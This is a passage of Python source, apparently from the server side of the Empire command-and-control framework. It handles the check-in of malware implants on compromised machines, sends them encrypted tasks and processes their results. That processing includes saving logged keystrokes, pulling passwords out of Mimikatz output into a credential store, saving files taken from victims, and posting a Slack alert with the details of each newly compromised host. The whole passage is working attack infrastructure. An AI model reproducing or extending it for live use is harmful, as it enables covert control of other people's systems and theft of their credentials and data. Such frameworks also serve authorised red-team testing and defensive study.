                        'print': True,
                        'message': message
                    })
                    dispatcher.send(signal, sender="agents/{}".format(sessionID))
                    # remove the agent from the cache/database
                    self.mainMenu.agents.remove_agent_db(sessionID)
                    return "ERROR: Agent %s posted invalid sysinfo checkin format: %s" % (sessionID, message)

                # verify the nonce
                if int(parts[0]) != (int(self.mainMenu.agents.get_agent_nonce_db(sessionID)) + 1):
                    message = "[!] Invalid nonce returned from {}".format(sessionID)
                    signal = json.dumps({
                        'print': True,
                        'message': message
                    })
                    dispatcher.send(signal, sender="agents/{}".format(sessionID))
                    # remove the agent from the cache/database
                    self.mainMenu.agents.remove_agent_db(sessionID)
                    return "ERROR: Invalid nonce returned from %s" % (sessionID)

                message = "[!] Nonce verified: agent {} posted valid sysinfo checkin format: {}".format(sessionID,
                                                                                                        message)
                signal = json.dumps({
                    'print': False,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(sessionID))

                listener = str(parts[1], 'utf-8')
                domainname = str(parts[2], 'utf-8')
                username = str(parts[3], 'utf-8')
                hostname = str(parts[4], 'utf-8')
                external_ip = clientIP
                internal_ip = str(parts[5], 'utf-8')
                os_details = str(parts[6], 'utf-8')
                high_integrity = str(parts[7], 'utf-8')
                process_name = str(parts[8], 'utf-8')
                process_id = str(parts[9], 'utf-8')
                language = str(parts[10], 'utf-8')
                language_version = str(parts[11], 'utf-8')
                architecture = str(parts[12], 'utf-8')
                if high_integrity == "True":
                    high_integrity = 1
                else:
                    high_integrity = 0

            except Exception as e:
                message = "[!] Exception in agents.handle_agent_staging() for {} : {}".format(sessionID, e)
                signal = json.dumps({
                    'print': True,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(sessionID))
                # remove the agent from the cache/database
                self.mainMenu.agents.remove_agent_db(sessionID)
                return "Error: Exception in agents.handle_agent_staging() for %s : %s" % (sessionID, e)

            if domainname and domainname.strip() != '':
                username = "%s\\%s" % (domainname, username)

            # update the agent with this new information
            self.mainMenu.agents.update_agent_sysinfo_db(sessionID, listener=listenerName, internal_ip=internal_ip,
                                                         username=username, hostname=hostname, os_details=os_details,
                                                         high_integrity=high_integrity, process_name=process_name,
                                                         process_id=process_id, language_version=language_version,
                                                         language=language, architecture=architecture)

            # signal to Slack that this agent is now active

            slack_webhook_url = listenerOptions['SlackURL']['Value']
            if slack_webhook_url != "":
                slack_text = ":biohazard_sign: NEW AGENT :biohazard_sign:\r\n```Machine Name: %s\r\nInternal IP: %s\r\nExternal IP: %s\r\nUser: %s\r\nOS Version: %s\r\nAgent ID: %s```" % (
                    hostname, internal_ip, external_ip, username, os_details, sessionID)
                helpers.slackMessage(slack_webhook_url, slack_text)

            # signal everyone that this agent is now active
            message = "[+] Initial agent {} from {} now active (Slack)".format(sessionID, clientIP)
            signal = json.dumps({
                'print': True,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(sessionID))

            agent = self.mainMenu.agents.get_agent_for_socket(sessionID)
            if self.mainMenu.socketio:
                self.mainMenu.socketio.emit('agents/stage2', agent, broadcast=True)

            # save the initial sysinfo information in the agent log
            output = messages.display_agent(agent, returnAsString=True)
            output += "[+] Agent %s now active:\n" % (sessionID)
            self.mainMenu.agents.save_agent_log(sessionID, output)

            # if a script autorun is set, set that as the agent's first tasking
            autorun = self.get_autoruns_db()
            if autorun and autorun[0] != '' and autorun[1] != '':
                self.add_agent_task_db(sessionID, autorun[0], autorun[1])

            if language.lower() in self.mainMenu.autoRuns and len(self.mainMenu.autoRuns[language.lower()]) > 0:
                autorunCmds = ["interact %s" % sessionID]
                autorunCmds.extend(self.mainMenu.autoRuns[language.lower()])
                autorunCmds.extend(["lastautoruncmd"])
                self.mainMenu.resourceQueue.extend(autorunCmds)
                try:
                    # this will cause the cmdloop() to start processing the autoruns
                    self.mainMenu.do_agents("kickit")
                except Exception as e:
                    if e == "endautorun":
                        pass
                    else:
                        print(helpers.color("[!] End of Autorun Queue"))

            return "STAGE2: %s" % (sessionID)

        else:
            message = "[!] Invalid staging request packet from {} at {} : {}".format(sessionID, clientIP, meta)
            signal = json.dumps({
                'print': True,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(sessionID))

    def handle_agent_data(self, stagingKey, routingPacket, listenerOptions, clientIP='0.0.0.0', update_lastseen=True):
        """
        Take the routing packet w/ raw encrypted data from an agent and
        process as appropriately.

        Abstracted out sufficiently for any listener module to use.
        """
        if len(routingPacket) < 20:
            message = "[!] handle_agent_data(): routingPacket wrong length: {}".format(len(routingPacket))
            signal = json.dumps({
                'print': False,
                'message': message
            })
            dispatcher.send(signal, sender="empire")
            return None

        if isinstance(routingPacket, str):
            routingPacket = routingPacket.encode('UTF-8')
        routingPacket = packets.parse_routing_packet(stagingKey, routingPacket)
        if not routingPacket:
            return [('', "ERROR: invalid routing packet")]

        dataToReturn = []

        # process each routing packet
        for sessionID, (language, meta, additional, encData) in routingPacket.items():
            if meta == 'STAGE0' or meta == 'STAGE1' or meta == 'STAGE2':
                message = "[*] handle_agent_data(): sessionID {} issued a {} request".format(sessionID, meta)
                signal = json.dumps({
                    'print': False,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(sessionID))
                dataToReturn.append((language, self.handle_agent_staging(sessionID, language, meta, additional, encData,
                                                                         stagingKey, listenerOptions, clientIP)))

            elif sessionID not in self.agents:
                message = "[!] handle_agent_data(): sessionID {} not present".format(sessionID)
                signal = json.dumps({
                    'print': False,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(sessionID))
                dataToReturn.append(('', "ERROR: sessionID %s not in cache!" % (sessionID)))

            elif meta == 'TASKING_REQUEST':
                message = "[*] handle_agent_data(): sessionID {} issued a TASKING_REQUEST".format(sessionID)
                signal = json.dumps({
                    'print': False,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(sessionID))
                dataToReturn.append((language, self.handle_agent_request(sessionID, language, stagingKey)))

            elif meta == 'RESULT_POST':
                message = "[*] handle_agent_data(): sessionID {} issued a RESULT_POST".format(sessionID)
                signal = json.dumps({
                    'print': False,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(sessionID))
                dataToReturn.append((language, self.handle_agent_response(sessionID, encData, update_lastseen)))

            else:
                message = "[!] handle_agent_data(): sessionID {} gave unhandled meta tag in routing packet: {}".format(
                    sessionID, meta)
                signal = json.dumps({
                    'print': True,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(sessionID))
        return dataToReturn

    def handle_agent_request(self, sessionID, language, stagingKey, update_lastseen=True):
        """
        Update the agent's last seen time and return any encrypted taskings.

        TODO: does this need self.lock?
        """
        if sessionID not in self.agents:
            message = "[!] handle_agent_request(): sessionID {} not present".format(sessionID)
            signal = json.dumps({
                'print': True,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(sessionID))
            return None

        # update the client's last seen time
        if update_lastseen:
            self.update_agent_lastseen_db(sessionID)

        # retrieve all agent taskings from the cache
        taskings = self.get_agent_tasks_db(sessionID)

        if taskings and taskings != []:

            all_task_packets = b''

            # build tasking packets for everything we have
            for tasking in taskings:
                input_full = tasking.input_full
                if tasking.task_name == "TASK_CSHARP":
                    with open(tasking.input_full.split("|")[0], "rb") as f:
                        input_full = f.read()
                    input_full = base64.b64encode(input_full).decode("UTF-8")
                    input_full += tasking.input_full.split("|", maxsplit=1)[1]
                all_task_packets += packets.build_task_packet(tasking.task_name, input_full, tasking.id)

            # get the session key for the agent
            session_key = self.agents[sessionID]['sessionKey']

            # encrypt the tasking packets with the agent's session key
            encrypted_data = encryption.aes_encrypt_then_hmac(session_key, all_task_packets)

            return packets.build_routing_packet(stagingKey, sessionID, language, meta='SERVER_RESPONSE',
                                                encData=encrypted_data)

        # if no tasking for the agent
        else:
            return None

    def handle_agent_response(self, sessionID, encData, update_lastseen=False):
        """
        Takes a sessionID and posted encrypted data response, decrypt
        everything and handle results as appropriate.

        TODO: does this need self.lock?
        """

        if sessionID not in self.agents:
            message = "[!] handle_agent_response(): sessionID {} not in cache".format(sessionID)
            signal = json.dumps({
                'print': True,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(sessionID))
            return None

        # extract the agent's session key
        sessionKey = self.agents[sessionID]['sessionKey']

        # update the client's last seen time
        if update_lastseen:
            self.update_agent_lastseen_db(sessionID)

        try:
            # verify, decrypt and depad the packet
            packet = encryption.aes_decrypt_and_verify(sessionKey, encData)

            # process the packet and extract necessary data
            responsePackets = packets.parse_result_packets(packet)
            results = False
            # process each result packet
            for (responseName, totalPacket, packetNum, taskID, length, data) in responsePackets:
                # process the agent's response
                self.process_agent_packet(sessionID, responseName, taskID, data)
                results = True
            if results:
                # signal that this agent returned results
                message = "[*] Agent {} returned results.".format(sessionID)
                signal = json.dumps({
                    'print': False,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(sessionID))

            # return a 200/valid
            return 'VALID'


        except Exception as e:
            message = "[!] Error processing result packet from {} : {}".format(sessionID, e)
            signal = json.dumps({
                'print': True,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(sessionID))

            return None

    def process_agent_packet(self, session_id, response_name, task_id, data):
        """
        Handle the result packet based on sessionID and responseName.
        """
        key_log_task_id = None

        # see if we were passed a name instead of an ID
        name_id = self.get_agent_id_db(session_id)
        if name_id:
            session_id = name_id

        # report the agent result in the reporting database
        message = "[*] Agent {} got results".format(session_id)
        signal = json.dumps({
            'print': False,
            'message': message,
            'response_name': response_name,
            'task_id': task_id,
            'event_type': 'result'
        })
        dispatcher.send(signal, sender="agents/{}".format(session_id))

        # insert task results into the database, if it's not a file
        if task_id != 0 and response_name not in ["TASK_DOWNLOAD", "TASK_CMD_JOB_SAVE",
                                                  "TASK_CMD_WAIT_SAVE"] and data is not None:
            # Update result with data
            tasking = Session().query(models.Tasking).filter(and_(models.Tasking.id == task_id,
                                                                  models.Tasking.agent_id == session_id)).first()
            # add keystrokes to database
            if 'function Get-Keystrokes' in tasking.input:
                key_log_task_id = tasking.id
                if tasking.output is None:
                    tasking.output = ''

                if data:
                    raw_key_stroke = data.decode('UTF-8')
                    tasking.output += raw_key_stroke.replace("\r\n", "").replace("[SpaceBar]", "").replace('\b', '')\
                        .replace("[Shift]", "").replace("[Enter]\r", "\r\n")
            else:
                tasking.original_output = data
                tasking.output = data

            hooks.run_hooks(hooks.BEFORE_TASKING_RESULT_HOOK, tasking)
            tasking = hooks.run_filters(hooks.BEFORE_TASKING_RESULT_FILTER, tasking)

            Session().commit()

            hooks.run_hooks(hooks.AFTER_TASKING_RESULT_HOOK, tasking)

            if self.mainMenu.socketio and 'function Get-Keystrokes' not in tasking.input:
                result_string = tasking.output
                if isinstance(result_string, bytes):
                    result_string = tasking.output.decode('UTF-8')

                self.mainMenu.socketio.emit(f'agents/{session_id}/task', {
                    'taskID': tasking.id, 'command': tasking.input,
                    'results': result_string, 'user_id': tasking.user_id,
                    'created_at': tasking.created_at, 'updated_at': tasking.updated_at,
                    'username': tasking.user.username, 'agent': tasking.agent_id}, broadcast=True)

        # TODO: for heavy traffic packets, check these first (i.e. SOCKS?)
        #       so this logic is skipped

        if response_name == "ERROR":
            # error code
            message = "[!] Received error response from {}".format(session_id)
            signal = json.dumps({
                'print': True,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(session_id))

            if isinstance(data, bytes):
                data = data.decode('UTF-8')
            # update the agent log
            self.save_agent_log(session_id, "[!] Error response: " + data)


        elif response_name == "TASK_SYSINFO":
            # sys info response -> update the host info
            data = data.decode('utf-8')
            parts = data.split("|")
            if len(parts) < 12:
                message = "[!] Invalid sysinfo response from {}".format(session_id)
                signal = json.dumps({
                    'print': True,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(session_id))
            else:
                # extract appropriate system information
                listener = parts[1]
                domainname = parts[2]
                username = parts[3]
                hostname = parts[4]
                internal_ip = parts[5]
                os_details = parts[6]
                high_integrity = parts[7]
                process_name = parts[8]
                process_id = parts[9]
                language = parts[10]
                language_version = parts[11]
                architecture = parts[12]
                if high_integrity == 'True':
                    high_integrity = 1
                else:
                    high_integrity = 0

                # username = str(domainname)+"\\"+str(username)
                username = "%s\\%s" % (domainname, username)

                # update the agent with this new information
                self.mainMenu.agents.update_agent_sysinfo_db(session_id, listener=listener, internal_ip=internal_ip,
                                                             username=username, hostname=hostname,
                                                             os_details=os_details, high_integrity=high_integrity,
                                                             process_name=process_name, process_id=process_id,
                                                             language_version=language_version, language=language,
                                                             architecture=architecture)

                sysinfo = '{0: <18}'.format("Listener:") + listener + "\n"
                sysinfo += '{0: <18}'.format("Internal IP:") + internal_ip + "\n"
                sysinfo += '{0: <18}'.format("Username:") + username + "\n"
                sysinfo += '{0: <18}'.format("Hostname:") + hostname + "\n"
                sysinfo += '{0: <18}'.format("OS:") + os_details + "\n"
                sysinfo += '{0: <18}'.format("High Integrity:") + str(high_integrity) + "\n"
                sysinfo += '{0: <18}'.format("Process Name:") + process_name + "\n"
                sysinfo += '{0: <18}'.format("Process ID:") + process_id + "\n"
                sysinfo += '{0: <18}'.format("Language:") + language + "\n"
                sysinfo += '{0: <18}'.format("Language Version:") + language_version + "\n"
                sysinfo += '{0: <18}'.format("Architecture:") + architecture + "\n"

                # update the agent log
                self.save_agent_log(session_id, sysinfo)


        elif response_name == "TASK_EXIT":
            # exit command response
            # let everyone know this agent exited
            message = "[!] Agent {} exiting".format(session_id)
            signal = json.dumps({
                'print': True,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(session_id))

            # update the agent results and log
            self.save_agent_log(session_id, data)

            # set agent to killed in the database
            agent = Session().query(models.Agent).filter(models.Agent.session_id == session_id).first()
            agent.killed = True
            Session().commit()

        elif response_name == "TASK_SHELL":
            # shell command response
            # update the agent log
            self.save_agent_log(session_id, data)

        elif response_name == "TASK_CSHARP":
            # shell command response
            # update the agent log
            self.save_agent_log(session_id, data)

        elif response_name == "TASK_DOWNLOAD":
            # file download
            if isinstance(data, bytes):
                data = data.decode('UTF-8')

            parts = data.split("|")
            if len(parts) != 4:
                message = "[!] Received invalid file download response from {}".format(session_id)
                signal = json.dumps({
                    'print': True,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(session_id))
            else:
                index, path, filesize, data = parts
                # decode the file data and save it off as appropriate
                file_data = helpers.decode_base64(data.encode('UTF-8'))
                name = self.get_agent_name_db(session_id)

                if index == "0":
                    self.save_file(name, path, file_data, filesize)
                else:
                    self.save_file(name, path, file_data, filesize, append=True)
                # update the agent log
                msg = "file download: %s, part: %s" % (path, index)
                self.save_agent_log(session_id, msg)

        elif response_name == "TASK_DIR_LIST":
            try:
                result = json.loads(data.decode('utf-8'))
                self.update_dir_list(session_id, result)
            except ValueError as e:
                pass

            self.save_agent_log(session_id, data)

        elif response_name == "TASK_GETDOWNLOADS":
            if not data or data.strip().strip() == "":
                data = "[*] No active downloads"

            # update the agent log
            self.save_agent_log(session_id, data)

        elif response_name == "TASK_STOPDOWNLOAD":
            # download kill response
            # update the agent log
            self.save_agent_log(session_id, data)

        elif response_name == "TASK_UPLOAD":
            pass


        elif response_name == "TASK_GETJOBS":

            if not data or data.strip().strip() == "":
                data = "[*] No active jobs"

            # running jobs
            # update the agent log
            self.save_agent_log(session_id, data)


        elif response_name == "TASK_STOPJOB":
            # job kill response
            # update the agent log
            self.save_agent_log(session_id, data)


        elif response_name == "TASK_CMD_WAIT":

            # dynamic script output -> blocking

            # see if there are any credentials to parse
            time = helpers.get_datetime()
            creds = helpers.parse_credentials(data)

            if creds:
                for cred in creds:

                    hostname = cred[4]

                    if hostname == "":
                        hostname = self.get_agent_hostname_db(session_id)

                    osDetails = self.get_agent_os_db(session_id)

                    self.mainMenu.credentials.add_credential(cred[0], cred[1], cred[2], cred[3], hostname, osDetails,
                                                             cred[5], time)

            # update the agent log
            self.save_agent_log(session_id, data)


        elif response_name == "TASK_CMD_WAIT_SAVE":

            # dynamic script output -> blocking, save data
            name = self.get_agent_name_db(session_id)

            # extract the file save prefix and extension
            prefix = data[0:15].strip().decode('UTF-8')
            extension = data[15:20].strip().decode('UTF-8')
            file_data = helpers.decode_base64(data[20:])

            # save the file off to the appropriate path
            save_path = "%s/%s_%s.%s" % (
                prefix, self.get_agent_hostname_db(session_id), helpers.get_file_datetime(), extension)
            final_save_path = self.save_module_file(name, save_path, file_data)

            # update the agent log
            msg = "[+] Output saved to .%s" % (final_save_path)
            self.save_agent_log(session_id, msg)

            # Retrieve tasking data
            tasking = Session().query(models.Tasking).filter(and_(models.Tasking.id == task_id,
                                                                  models.Tasking.agent == session_id)).first()

            # Send server notification for saving file
            self.mainMenu.socketio.emit(f'agents/{session_id}/task', {
                'taskID': tasking.id, 'command': tasking.input,
                'results': msg, 'user_id': tasking.user_id,
                'created_at': tasking.created_at, 'updated_at': tasking.updated_at,
                'username': tasking.user.username, 'agent': tasking.agent}, broadcast=True)

        elif response_name == "TASK_CMD_JOB":
            # check if this is the powershell keylogging task, if so, write output to file instead of screen
            if key_log_task_id and key_log_task_id == task_id:
                safePath = os.path.abspath("%s/downloads/" % self.mainMenu.installPath)
                savePath = "%s/downloads/%s/keystrokes.txt" % (self.mainMenu.installPath, session_id)
                if not os.path.abspath(savePath).startswith(safePath):
                    message = "[!] WARNING: agent {} attempted skywalker exploit!".format(self.sessionID)
                    signal = json.dumps({
                        'print': True,
                        'message': message
                    })
                    dispatcher.send(signal, sender="agents/{}".format(self.sessionID))
                    return

                with open(savePath, "a+") as f:
                    if isinstance(data, bytes):
                        data = data.decode('UTF-8')
                    new_results = data.replace("\r\n", "").replace("[SpaceBar]", "").replace('\b', '').replace(
                        "[Shift]", "").replace("[Enter]\r", "\r\n")
                    f.write(new_results)

            else:
                # dynamic script output -> non-blocking
                # see if there are any credentials to parse
                time = helpers.get_datetime()
                creds = helpers.parse_credentials(data)
                if creds:
                    for cred in creds:

                        hostname = cred[4]

                        if hostname == "":
                            hostname = self.get_agent_hostname_db(session_id)

                        osDetails = self.get_agent_os_db(session_id)

                        self.mainMenu.credentials.add_credential(cred[0], cred[1], cred[2], cred[3], hostname,
                                                                 osDetails, cred[5], time)

                # update the agent log
                self.save_agent_log(session_id, data)

            # TODO: redo this regex for really large AD dumps
            #   so a ton of data isn't kept in memory...?
            if isinstance(data, str):
                data = data.encode("UTF-8")
            parts = data.split(b"\n")
            if len(parts) > 10:
                time = helpers.get_datetime()
                if parts[0].startswith(b"Hostname:"):
                    # if we get Invoke-Mimikatz output, try to parse it and add
                    #   it to the internal credential store

                    # cred format: (credType, domain, username, password, hostname, sid, notes)
                    creds = helpers.parse_mimikatz(data)

                    for cred in creds:
                        hostname = cred[4]

                        if hostname == "":
                            hostname = self.get_agent_hostname_db(session_id)

                        osDetails = self.get_agent_os_db(session_id)

                        self.mainMenu.credentials.add_credential(cred[0], cred[1], cred[2], cred[3], hostname,
                                                                 osDetails, cred[5], time)


        elif response_name == "TASK_CMD_JOB_SAVE":
            # dynamic script output -> non-blocking, save data
            name = self.get_agent_name_db(session_id)

            # extract the file save prefix and extension
            prefix = data[0:15].strip()
            extension = data[15:20].strip()
            file_data = helpers.decode_base64(data[20:])

            # save the file off to the appropriate path
            save_path = "%s/%s_%s.%s" % (
                prefix, self.get_agent_hostname_db(session_id), helpers.get_file_datetime(), extension)
            final_save_path = self.save_module_file(name, save_path, file_data)

            # update the agent log
            msg = "Output saved to .%s" % (final_save_path)
            self.save_agent_log(session_id, msg)


        elif response_name == "TASK_SCRIPT_IMPORT":
            # update the agent log
            self.save_agent_log(session_id, data)

        elif response_name == "TASK_IMPORT_MODULE":
            # update the agent log
            self.save_agent_log(session_id, data)

        elif response_name == "TASK_VIEW_MODULE":
            # update the agent log
            self.save_agent_log(session_id, data)

        elif response_name == "TASK_REMOVE_MODULE":
            # update the agent log
            self.save_agent_log(session_id, data)

        elif response_name == "TASK_SCRIPT_COMMAND":
            # update the agent log
            self.save_agent_log(session_id, data)

        elif response_name == "TASK_SWITCH_LISTENER":
            # update the agent listener
            if isinstance(data, bytes):
                data = data.decode('UTF-8')

            listener_name = data[38:]

            self.update_agent_listener_db(session_id, listener_name)
            # update the agent log
            self.save_agent_log(session_id, data)
            message = "[+] Updated comms for {} to {}".format(session_id, listener_name)
            signal = json.dumps({
                'print': False,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(session_id))

        elif response_name == "TASK_UPDATE_LISTENERNAME":
            # The agent listener name variable has been updated agent side
            # update the agent log
            self.save_agent_log(session_id, data)
            message = "[+] Listener for '{}' updated to '{}'".format(session_id, data)
            signal = json.dumps({
                'print': False,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(session_id))

        else:
            print(helpers.color("[!] Unknown response %s from %s" % (response_name, session_id)))
